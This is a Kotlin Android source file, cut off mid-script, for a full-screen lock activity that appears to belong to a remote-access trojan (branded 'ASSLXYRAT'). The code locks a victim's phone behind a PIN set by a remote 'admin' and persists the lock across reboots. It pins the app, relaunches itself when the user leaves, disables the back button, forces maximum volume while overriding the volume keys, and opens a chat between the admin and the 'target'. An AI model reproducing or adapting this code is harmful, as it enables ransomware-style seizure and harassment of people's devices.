package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.AudioManager
import android.media.MediaPlayer
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.KeyEvent
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import org.json.JSONObject

class LockChatActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String = ""
    private var lockTitle: String = "Perangkat Terkunci"
    private var isReceiverRegistered = false
    private var isUnlocked = false
    private lateinit var audioManager: AudioManager

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    private val chatReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action != "com.sync.xxx.CHAT_FROM_ADMIN") return

            val message = intent.getStringExtra("message") ?: return
            val encodedMessage = JSONObject.quote(message)

            webView.post {
                webView.evaluateJavascript(
                    "receiveAdminMessage($encodedMessage)",
                    null
                )
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN) ?: ""
        lockTitle = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)
            ?: "Perangkat Terkunci"

        // ── SIMPAN STATUS UNTUK PEMULIHAN SAAT BOOT / REBOOT ──
        val prefs = getSharedPreferences("lock_prefs", Context.MODE_PRIVATE)
        prefs.edit().apply {
            putBoolean("is_locked", true)
            putString("lock_type", "v3_chat")
            putString(LockOverlayService.EXTRA_PIN, correctPin)
            putString(LockOverlayService.EXTRA_TITLE, lockTitle)
            apply()
        }

        setupWebView()
        registerReceivers()

        // ── Eksekusi Otomatis Sematkan Aplikasi / Pindah ke Pengaturan Keamanan ──
        enableLockTaskAuto()

        audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        forceMaxVolume()

        playLockSound()
    }

    private fun enableLockTaskAuto() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            if (dpm.isLockTaskPermitted(packageName)) {
                startLockTask()
            } else {
                startLockTask()
            }
        } catch (e: Exception) {
            Log.w("LockChatActivity", "Gagal startLockTask: ${e.message}")
            
            try {
                val intent = Intent(Settings.ACTION_SECURITY_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                startActivity(intent)
            } catch (_: Exception) {}
        }
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)
            ?: correctPin

        lockTitle = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)
            ?: lockTitle

        // ── UPDATE SHAREDPREFERENCES JIKA ADA INTENT BARU ──
        val prefs = getSharedPreferences("lock_prefs", Context.MODE_PRIVATE)
        prefs.edit().apply {
            putBoolean("is_locked", true)
            putString("lock_type", "v3_chat")
            putString(LockOverlayService.EXTRA_PIN, correctPin)
            putString(LockOverlayService.EXTRA_TITLE, lockTitle)
            apply()
        }
    }

    override fun onBackPressed() {
        if (!isUnlocked) return
        super.onBackPressed()
    }

    override fun onPause() {
        super.onPause()

        if (isUnlocked) return

        Handler(Looper.getMainLooper()).postDelayed({
            if (isUnlocked) return@postDelayed

            startActivity(Intent(this, LockChatActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                )
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            })
        }, 300)
    }

    override fun onStop() {
        super.onStop()

        if (isUnlocked) return

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
            startActivity(Intent(this, LockChatActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                )
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            })
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)

        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }

        webView.setBackgroundColor(android.graphics.Color.BLACK)
        webView.addJavascriptInterface(ChatBridge(), "ChatBridge")
        webView.webViewClient = WebViewClient()

        webView.loadDataWithBaseURL(
            null,
            buildLockChatHtml(),
            "text/html",
            "UTF-8",
            null
        )

        setContentView(webView)
    }

    private fun registerReceivers() {
        if (isReceiverRegistered) return

        val unlockFilter = IntentFilter("com.sync.xxx.UNLOCK")
        val chatFilter = IntentFilter("com.sync.xxx.CHAT_FROM_ADMIN")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(
                unlockReceiver,
                unlockFilter,
                RECEIVER_NOT_EXPORTED
            )
            registerReceiver(
                chatReceiver,
                chatFilter,
                RECEIVER_NOT_EXPORTED
            )
        } else {
            registerReceiver(unlockReceiver, unlockFilter)
            registerReceiver(chatReceiver, chatFilter)
        }

        isReceiverRegistered = true
    }

    override fun onDestroy() {
        super.onDestroy()

        try {
            stopLockTask()
        } catch (_: Exception) {
        }

        if (isReceiverRegistered) {
            try {
                unregisterReceiver(unlockReceiver)
            } catch (_: Exception) {
            }

            try {
                unregisterReceiver(chatReceiver)
            } catch (_: Exception) {
            }

            isReceiverRegistered = false
        }

        mediaPlayer?.release()
        mediaPlayer = null

        if (::webView.isInitialized) {
            webView.removeJavascriptInterface("ChatBridge")
            webView.destroy()
        }
    }

    inner class ChatBridge {

        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val isCorrect = pin == correctPin

            if (isCorrect) {
                // ── HAPUS STATUS KUNCI SAAT PIN BENAR ──
                val prefs = getSharedPreferences("lock_prefs", Context.MODE_PRIVATE)
                prefs.edit().putBoolean("is_locked", false).apply()

                Handler(Looper.getMainLooper()).post {
                    sendBroadcast(
                        Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                            putExtra(DeviceService.EXTRA_VALUE, "true")
                            setPackage(packageName)
                        }
                    )

                    sendBroadcast(
                        Intent("com.sync.xxx.UNLOCK_FROM_UI").apply {
                            setPackage(packageName)
                        }
                    )

                    sendBroadcast(
                        Intent("com.sync.xxx.UNLOCK").apply {
                            setPackage(packageName)
                        }
                    )
                }
            }

            return isCorrect
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle

        @JavascriptInterface
        fun sendMessage(message: String) {
            val cleanMessage = message.trim()
            if (cleanMessage.isEmpty() || cleanMessage.length > 2000) return

            val broadcastIntent = Intent("com.sync.xxx.CHAT_FROM_TARGET").apply {
                putExtra("message", cleanMessage)
                setPackage(packageName)
            }
            sendBroadcast(broadcastIntent)
        }
    }

    private fun forceMaxVolume() {
        try {
            val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, 0)
        } catch (_: Exception) {
        }
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN || keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
            forceMaxVolume()
            return true
        }
        return super.onKeyDown(keyCode, event)
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return

            mediaPlayer = MediaPlayer().apply {
                setDataSource(
                    afd.fileDescriptor,
                    afd.startOffset,
                    afd.length
                )
                afd.close()
                prepare()
                start()

                setOnCompletionListener {
                    release()
                    mediaPlayer = null
                }
            }
        } catch (_: Exception) {
        }
    }

    private fun buildLockChatHtml(): String {
        val safeTitle = lockTitle
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#39;")

        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
/* =========================================================
   NEOSOFT — Soft Neumorphic Secure Chat
   Rebuilt from the original structure/functionality.
   ========================================================= */
*,
*::before,
*::after{
  box-sizing:border-box;
  margin:0;
  padding:0;
}

:root{
  --bg:#e9eee9;
  --surface:#eef3ee;
  --surface-hi:#f7faf7;
  --surface-low:#e1e8e2;
  --mint:#76c7a5;
  --mint-dark:#4f9f7f;
  --mint-deep:#39755d;
  --yellow:#e7c85d;
  --yellow-dark:#b49332;
  --text:#26352e;
  --text-soft:#53645c;
  --muted:#718078;
  --muted-light:#96a39b;
  --line:#d1dbd4;
  --green-chat:#e4f1e9;
  --green-chat-line:#c9e0d2;
  --gold-chat:#f5efd8;
  --gold-chat-line:#e3d59a;
  --danger:#c95d63;

  --shadow-dark:rgba(83,99,90,.22);
  --shadow-dark-soft:rgba(83,99,90,.12);
  --shadow-light:rgba(255,255,255,.92);
  --shadow-light-strong:rgba(255,255,255,.98);

  --radius-xl:24px;
  --radius-lg:18px;
  --radius-md:14px;
  --radius-sm:11px;
}

html,
body{
  width:100%;
  height:100%;
  background:var(--bg);
  color:var(--text);
  font-family:'Outfit',sans-serif;
  -webkit-font-smoothing:antialiased;
  text-rendering:optimizeLegibility;
}

body{
  overflow:hidden;
}

/* Soft NeoSoft atmosphere */
body::before{
  content:"";
  position:fixed;
  inset:0;
  pointer-events:none;
  background:
    radial-gradient(circle at 8% 5%,rgba(118,199,165,.25),transparent 30%),
    radial-gradient(circle at 92% 92%,rgba(231,200,93,.18),transparent 28%),
    radial-gradient(circle at 50% 45%,rgba(255,255,255,.18),transparent 48%);
}

body::after{
  content:"";
  position:fixed;
  inset:0;
  pointer-events:none;
  opacity:.25;
  background-image:
    linear-gradient(rgba(65,90,78,.035) 1px,transparent 1px),
    linear-gradient(90deg,rgba(65,90,78,.035) 1px,transparent 1px);
  background-size:34px 34px;
}

/* App viewport */
.screen{
  position:relative;
  z-index:1;
  width:100%;
  height:100%;
  overflow-y:auto;
  padding:14px 12px 22px;
  scrollbar-width:thin;
  scrollbar-color:#bdc9c1 transparent;
}

.screen::-webkit-scrollbar{
  width:3px;
}

.screen::-webkit-scrollbar-thumb{
  background:#bdc9c1;
  border-radius:99px;
}

.content{
  width:100%;
  max-width:390px;
  min-height:100%;
  margin:0 auto;
  display:flex;
  flex-direction:column;
}

/* =========================================================
   MAIN NEOSOFT CARD
   ========================================================= */
.card{
  width:100%;
  min-height:calc(100vh - 36px);
  border:1px solid rgba(255,255,255,.86);
  border-radius:var(--radius-xl);
  background:rgba(238,243,238,.86);
  overflow:hidden;
  box-shadow:
    12px 12px 28px var(--shadow-dark),
    -12px -12px 28px var(--shadow-light);
  backdrop-filter:blur(7px);
}

.card-head{
  min-height:72px;
  padding:12px 13px;
  display:flex;
  align-items:center;
  gap:10px;
  border-bottom:1px solid var(--line);
  background:linear-gradient(
    145deg,
    rgba(255,255,255,.38),
    rgba(229,235,229,.25)
  );
}

.card-icon{
  width:40px;
  height:40px;
  flex:0 0 40px;
  display:flex;
  align-items:center;
  justify-content:center;
  border-radius:12px;
  color:var(--mint-dark);
  background:var(--surface);
  border:1px solid rgba(255,255,255,.9);
  box-shadow:
    inset 2px 2px 5px rgba(83,99,90,.11),
    inset -2px -2px 5px rgba(255,255,255,.95),
    4px 4px 9px rgba(83,99,90,.09);
}

.card-text{
  min-width:0;
  flex:1;
}

.card-title{
  overflow:hidden;
  white-space:nowrap;
  text-overflow:ellipsis;
  font-size:17px;
  line-height:1.15;
  font-weight:800;
  letter-spacing:-.2px;
}

.card-sub{
  margin-top:4px;
  color:var(--mint-dark);
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
  line-height:1.4;
  letter-spacing:1.1px;
}

.read-only{
  flex-shrink:0;
  padding:5px 7px;
  border-radius:8px;
  color:#77857e;
  background:rgba(225,232,226,.68);
  border:1px solid rgba(255,255,255,.82);
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
  line-height:1;
  letter-spacing:.8px;
  box-shadow:
    inset 1px 1px 3px rgba(83,99,90,.06),
    2px 2px 5px rgba(83,99,90,.06);
}

/* =========================================================
   CHAT AREA
   ========================================================= */
.chat-card{
  display:flex;
  flex-direction:column;
}

.chat-messages{
  flex:1;
  min-height:290px;
  overflow-y:auto;
  padding:14px 12px;
  display:flex;
  flex-direction:column;
  gap:9px;
  background:rgba(231,237,232,.40);
  scrollbar-width:thin;
  scrollbar-color:#c3cec6 transparent;
}

.chat-messages::-webkit-scrollbar{
  width:3px;
}

.chat-messages::-webkit-scrollbar-thumb{
  background:#c3cec6;
  border-radius:99px;
}

.chat-empty{
  min-height:100%;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  gap:9px;
  color:#929f97;
  font-family:'JetBrains Mono',monospace;
  font-size:8px;
  line-height:1.7;
  letter-spacing:.8px;
  text-align:center;
}

.chat-empty svg{
  width:38px;
  height:38px;
  padding:8px;
  border-radius:12px;
  color:#83958b;
  background:var(--surface);
  border:1px solid rgba(255,255,255,.86);
  box-shadow:
    inset 2px 2px 5px rgba(83,99,90,.08),
    inset -2px -2px 5px rgba(255,255,255,.92),
    3px 3px 7px rgba(83,99,90,.08);
}

/* Messages */
.msg-row{
  width:fit-content;
  max-width:88%;
  display:flex;
  flex-direction:column;
  animation:messageIn .18s ease both;
}

@keyframes messageIn{
  from{
    opacity:0;
    transform:translateY(4px);
  }
  to{
    opacity:1;
    transform:none;
  }
}

.msg-row.admin{
  align-self:flex-start;
}

.msg-row.target{
  align-self:flex-end;
}

.msg-sender{
  margin-bottom:3px;
  color:var(--mint-dark);
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
  font-weight:500;
  letter-spacing:1px;
}

.msg-row.target .msg-sender{
  color:var(--yellow-dark);
  text-align:right;
}

.msg-bubble{
  padding:9px 12px;
  font-size:13px;
  line-height:1.45;
  overflow-wrap:anywhere;
  box-shadow:
    4px 4px 9px rgba(83,99,90,.09),
    -3px -3px 8px rgba(255,255,255,.72);
}

.msg-row.admin .msg-bubble{
  border-radius:5px 14px 14px 14px;
  background:var(--green-chat);
  border:1px solid var(--green-chat-line);
  color:#395047;
}

.msg-row.target .msg-bubble{
  border-radius:14px 5px 14px 14px;
  background:var(--gold-chat);
  border:1px solid var(--gold-chat-line);
  color:#5d5431;
}

.msg-time{
  margin-top:3px;
  color:#8c9991;
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
}

.msg-row.target .msg-time{
  text-align:right;
}

/* =========================================================
   INPUT / ACTIONS
   ========================================================= */
.chat-input-area{
  padding:10px;
  border-top:1px solid var(--line);
  background:rgba(255,255,255,.24);
}

.chat-input-row{
  display:flex;
  align-items:flex-end;
  gap:7px;
  width:100%;
}

.chat-input{
  flex:1;
  min-width:0;
  min-height:41px;
  max-height:80px;
  resize:none;
  outline:none;
  border-radius:12px;
  border:1px solid #d1dbd4;
  background:var(--surface);
  color:var(--text);
  padding:10px 11px;
  font-family:'Outfit',sans-serif;
  font-size:13px;
  line-height:1.35;
  box-shadow:
    inset 3px 3px 7px rgba(83,99,90,.10),
    inset -3px -3px 7px rgba(255,255,255,.9);
  transition:border-color .16s,box-shadow .16s;
}

.chat-input:focus{
  border-color:rgba(79,159,127,.62);
  box-shadow:
    inset 2px 2px 5px rgba(83,99,90,.08),
    inset -2px -2px 5px rgba(255,255,255,.9),
    0 0 0 3px rgba(118,199,165,.10);
}

.chat-input::placeholder{
  color:#9aa7a0;
}

.send-btn{
  width:41px;
  height:41px;
  flex:0 0 41px;
  border-radius:12px;
  border:1px solid rgba(255,255,255,.92);
  background:linear-gradient(145deg,#eff5f0,#e0e9e2);
  color:var(--mint-dark);
  display:flex;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  -webkit-tap-highlight-color:transparent;
  box-shadow:
    5px 5px 10px rgba(83,99,90,.14),
    -5px -5px 10px rgba(255,255,255,.88);
  transition:transform .12s,box-shadow .12s;
}

.send-btn:active{
  transform:scale(.94);
  box-shadow:
    inset 3px 3px 7px rgba(83,99,90,.12),
    inset -2px -2px 5px rgba(255,255,255,.8);
}

.unlock-btn{
  width:100%;
  height:41px;
  margin-top:8px;
  border-radius:12px;
  border:1px solid rgba(255,255,255,.9);
  background:linear-gradient(145deg,#eff5f0,#e1ebe4);
  color:#4e7e68;
  font-size:12px;
  font-weight:800;
  display:flex;
  align-items:center;
  justify-content:center;
  gap:8px;
  cursor:pointer;
  -webkit-tap-highlight-color:transparent;
  box-shadow:
    5px 5px 11px rgba(83,99,90,.14),
    -5px -5px 11px rgba(255,255,255,.9);
  transition:transform .14s,box-shadow .14s;
}

.unlock-btn:active{
  transform:scale(.97);
  box-shadow:
    inset 3px 3px 7px rgba(83,99,90,.13),
    inset -2px -2px 5px rgba(255,255,255,.78);
}

/* =========================================================
   PIN MODAL
   ========================================================= */
.pin-modal{
  position:fixed;
  inset:0;
  z-index:50;
  padding:16px;
  display:flex;
  align-items:center;
  justify-content:center;
  background:rgba(220,228,222,.68);
  backdrop-filter:blur(10px);
  opacity:0;
  visibility:hidden;
  pointer-events:none;
  transition:opacity .18s ease,visibility .18s ease;
}

.pin-modal.open{
  opacity:1;
  visibility:visible;
  pointer-events:auto;
}

.pin-modal-card{
  width:100%;
  max-width:340px;
  max-height:92vh;
  overflow-y:auto;
  border-radius:var(--radius-xl);
  border:1px solid rgba(255,255,255,.94);
  background:#eaf0eb;
  box-shadow:
    15px 15px 34px rgba(83,99,90,.23),
    -13px -13px 30px rgba(255,255,255,.96);
  transform:translateY(14px) scale(.97);
  transition:transform .18s ease;
}

.pin-modal.open .pin-modal-card{
  transform:translateY(0) scale(1);
}

.pin-modal-head{
  min-height:58px;
  padding:10px 12px;
  border-bottom:1px solid #d3ddd6;
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap:10px;
  background:rgba(255,255,255,.23);
}

.pin-modal-title-wrap{
  display:flex;
  align-items:center;
  gap:9px;
}

.pin-modal-title{
  color:var(--text);
  font-size:15px;
  font-weight:800;
}

.pin-modal-sub{
  margin-top:2px;
  color:#7d8c83;
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
  letter-spacing:1.2px;
}

.pin-close{
  width:34px;
  height:34px;
  flex:0 0 34px;
  border-radius:11px;
  border:1px solid rgba(255,255,255,.9);
  background:var(--surface);
  color:#718078;
  display:flex;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  box-shadow:
    3px 3px 7px rgba(83,99,90,.12),
    -3px -3px 7px rgba(255,255,255,.85);
}

.pin-close:active{
  transform:scale(.93);
}

.pin-content{
  padding:15px 14px 17px;
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:10px;
}

.pin-icon-wrap{
  position:relative;
  width:62px;
  height:62px;
  display:flex;
  align-items:center;
  justify-content:center;
}

.pin-ring{
  position:absolute;
  inset:0;
  border-radius:50%;
  border:1px solid rgba(118,199,165,.45);
  animation:ringPulse 2s infinite;
}

.pin-ring.outer{
  inset:-7px;
  border-color:rgba(231,200,93,.28);
  animation-delay:.45s;
}

@keyframes ringPulse{
  0%,100%{
    opacity:.8;
    transform:scale(1);
  }
  50%{
    opacity:.3;
    transform:scale(1.06);
  }
}

.pin-icon{
  width:52px;
  height:52px;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  color:var(--mint-dark);
  background:#eaf1eb;
  border:1px solid rgba(255,255,255,.9);
  box-shadow:
    inset 3px 3px 7px rgba(83,99,90,.12),
    inset -3px -3px 7px rgba(255,255,255,.9),
    5px 5px 12px rgba(83,99,90,.12),
    -5px -5px 12px rgba(255,255,255,.9);
}

.pin-title{
  font-size:20px;
  font-weight:800;
  color:var(--text);
}

.pin-subtitle{
  margin-top:-5px;
  color:#7d8c83;
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
  letter-spacing:1.3px;
  text-align:center;
}

.dots{
  min-height:23px;
  display:flex;
  align-items:center;
  gap:12px;
}

.dot{
  width:11px;
  height:11px;
  border-radius:50%;
  border:1.4px solid #b5c2ba;
  background:#edf2ed;
  transition:.17s;
  box-shadow:inset 2px 2px 4px rgba(83,99,90,.09);
}

.dot.filled{
  background:var(--mint);
  border-color:var(--mint-dark);
  box-shadow:
    0 0 10px rgba(118,199,165,.55),
    inset -1px -1px 2px rgba(255,255,255,.4);
  transform:scale(1.08);
}

.dot.error{
  border-color:var(--danger);
  background:#f2cdd0;
  animation:shake .35s ease;
}

@keyframes shake{
  0%,100%{transform:translateX(0)}
  25%{transform:translateX(-5px)}
  75%{transform:translateX(5px)}
}

.pin-status{
  min-height:17px;
  color:#89968f;
  font-family:'JetBrains Mono',monospace;
  font-size:8px;
  letter-spacing:1.2px;
  text-align:center;
}

.pin-status.err{color:#b74f57}
.pin-status.ok{color:#4d9b79}

/* Keypad */
.keypad{
  width:100%;
  display:grid;
  grid-template-columns:repeat(3,1fr);
  gap:8px;
}

.key{
  height:53px;
  border-radius:13px;
  border:1px solid rgba(255,255,255,.86);
  background:linear-gradient(145deg,#eef3ee,#e2e9e3);
  color:var(--text);
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  user-select:none;
  -webkit-tap-highlight-color:transparent;
  transition:.12s;
  box-shadow:
    5px 5px 10px rgba(83,99,90,.14),
    -5px -5px 10px rgba(255,255,255,.88);
}

.key:active{
  transform:scale(.94);
  box-shadow:
    inset 3px 3px 7px rgba(83,99,90,.13),
    inset -3px -3px 7px rgba(255,255,255,.8);
}

.key .num{
  font-size:20px;
  font-weight:700;
  line-height:1;
}

.key .sub{
  margin-top:2px;
  color:#84938a;
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
  letter-spacing:1.7px;
}

.key.del{
  color:#668678;
}

.key.empty{
  opacity:0;
  pointer-events:none;
}

/* Small phones */
@media (max-height:650px){
  .screen{
    padding-top:9px;
    padding-bottom:14px;
  }

  .card{
    min-height:calc(100vh - 23px);
  }

  .card-head{
    min-height:62px;
  }

  .chat-messages{
    min-height:240px;
    padding:10px;
  }

  .key{
    height:47px;
  }

  .pin-content{
    padding-top:11px;
    padding-bottom:13px;
    gap:8px;
  }
}

@media (min-width:600px){
  .content{
    max-width:420px;
  }
}
</style>
</head>
<body>

<div class="screen">
  <div class="content">

    <section class="card chat-card">
      <div class="card-head">
        <div class="card-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="3" y="11" width="18" height="11" rx="2"/>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
          </svg>
        </div>

        <div class="card-text">
          <div class="card-title">$safeTitle</div>
          <div class="card-sub">LOCK CHAT • CODED BY ASSLXYRAT</div>
        </div>

        <div class="read-only">LOCKED</div>
      </div>

      <div class="chat-messages" id="chatMessages">
        <div class="chat-empty" id="chatEmpty">
          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1">
            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
          </svg>
          <span>
            Belum ada pesan dari admin<br>
            Pesan baru akan tampil di bagian ini
          </span>
        </div>
      </div>

      <div class="chat-input-area">
        <div class="chat-input-row">
          <textarea class="chat-input" id="chatInput" rows="1" maxlength="2000"
            placeholder="Ketik pesan..."
            oninput="resizeChatInput(this)"
            onkeydown="handleChatKey(event)"></textarea>

          <button class="send-btn" type="button" onclick="sendMsg()" aria-label="Kirim balasan">
            <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3">
              <line x1="22" y1="2" x2="11" y2="13"/>
              <polygon points="22 2 15 22 11 13 2 9 22 2"/>
            </svg>
          </button>
        </div>

        <button class="unlock-btn" type="button" onclick="openPinPopup()">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="3" y="11" width="18" height="11" rx="2"/>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
          </svg>
          UNLOCK PIN
        </button>
      </div>
    </section>

  </div>
</div>

<div class="pin-modal" id="pinModal" onclick="handlePinBackdrop(event)">
  <section class="pin-modal-card">

    <div class="pin-modal-head">
      <div class="pin-modal-title-wrap">
        <div class="card-icon" style="width:32px;height:32px;border-radius:10px;">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="3" y="11" width="18" height="11" rx="2"/>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
          </svg>
        </div>
        <div>
          <div class="pin-modal-title">Buka Perangkat</div>
          <div class="pin-modal-sub">INPUT SECURITY PIN</div>
        </div>
      </div>

      <button class="pin-close" type="button" onclick="closePinPopup()" aria-label="Tutup popup PIN">
        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <line x1="18" y1="6" x2="6" y2="18"/>
          <line x1="6" y1="6" x2="18" y2="18"/>
        </svg>
      </button>
    </div>

    <div class="pin-content">
      <div class="pin-icon-wrap">
        <div class="pin-ring outer"></div>
        <div class="pin-ring"></div>

        <div class="pin-icon">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <rect x="3" y="11" width="18" height="11" rx="2"/>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
            <circle cx="12" cy="16" r="1.5" fill="currentColor" stroke="none"/>
          </svg>
        </div>
      </div>

      <div class="pin-title">Masukkan PIN</div>
      <div class="pin-subtitle">4 DIGIT UNTUK MEMBUKA PERANGKAT</div>

      <div class="dots">
        <div class="dot" id="d0"></div>
        <div class="dot" id="d1"></div>
        <div class="dot" id="d2"></div>
        <div class="dot" id="d3"></div>
      </div>

      <div class="pin-status" id="pinStatus">Ketuk angka di bawah</div>

      <div class="keypad" id="keypad">
        <div class="key" data-n="1"><span class="num">1</span><span class="sub">—</span></div>
        <div class="key" data-n="2"><span class="num">2</span><span class="sub">ABC</span></div>
        <div class="key" data-n="3"><span class="num">3</span><span class="sub">DEF</span></div>
        <div class="key" data-n="4"><span class="num">4</span><span class="sub">GHI</span></div>
        <div class="key" data-n="5"><span class="num">5</span><span class="sub">JKL</span></div>
        <div class="key" data-n="6"><span class="num">6</span><span class="sub">MNO</span></div>
        <div class="key" data-n="7"><span class="num">7</span><span class="sub">PQRS</span></div>
        <div class="key" data-n="8"><span class="num">8</span><span class="sub">TUV</span></div>
        <div class="key" data-n="9"><span class="num">9</span><span class="sub">WXYZ</span></div>
        <div class="key empty"></div>
        <div class="key" data-n="0"><span class="num">0</span></div>
        <div class="key del" data-del="1">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
            <line x1="18" y1="9" x2="12" y2="15"/>
            <line x1="12" y1="9" x2="18" y2="15"/>
          </svg>
        </div>
      </div>
    </div>
  </section>
</div>

<script>
var pin = ''
var blocked = false

function receiveAdminMessage(message) {
  addMessage('admin', message)
}

function sendMsg() {
  var input = document.getElementById('chatInput')
  var message = input.value.trim()
  if (!message) return

  input.value = ''
  input.style.height = '40px'

  addMessage('target', message)

  try {
    ChatBridge.sendMessage(message)
  } catch (error) {}
}

function handleChatKey(event) {
  if (event.key === 'Enter' && !event.shiftKey) {
    event.preventDefault()
    sendMsg()
  }
}

function resizeChatInput(input) {
  input.style.height = '40px'
  input.style.height = Math.min(input.scrollHeight, 76) + 'px'
}

function addMessage(from, text) {
  var empty = document.getElementById('chatEmpty')
  if (empty) empty.style.display = 'none'

  var container = document.getElementById('chatMessages')
  var now = new Date()
  var time =
    now.getHours().toString().padStart(2, '0') +
    ':' +
    now.getMinutes().toString().padStart(2, '0')

  var isAdmin = from === 'admin'
  var row = document.createElement('div')
  row.className = 'msg-row ' + (isAdmin ? 'admin' : 'target')

  row.innerHTML =
    '<div class="msg-sender">' + (isAdmin ? 'ADMIN' : 'KAMU') + '</div>' +
    '<div class="msg-bubble">' + escHtml(String(text)) + '</div>' +
    '<div class="msg-time">' + time + '</div>'

  container.appendChild(row)
  container.scrollTop = container.scrollHeight
}

function escHtml(text) {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

function openPinPopup() {
  pin = ''
  blocked = false
  updateDots()
  setStatus('Ketuk angka di bawah', false, false)
  document.getElementById('pinModal').classList.add('open')
}

function closePinPopup() {
  pin = ''
  blocked = false
  updateDots()
  setStatus('Ketuk angka di bawah', false, false)
  document.getElementById('pinModal').classList.remove('open')
}

function handlePinBackdrop(event) {
  if (event.target && event.target.id === 'pinModal') {
    closePinPopup()
  }
}

document.getElementById('keypad').addEventListener('touchend', function(event) {
  event.preventDefault()
  var key = event.target.closest('.key')
  if (!key || key.classList.contains('empty')) return
  if (key.dataset.del) { doDelete(); return }
  if (key.dataset.n !== undefined) doPress(key.dataset.n)
}, {passive:false})

document.getElementById('keypad').addEventListener('click', function(event) {
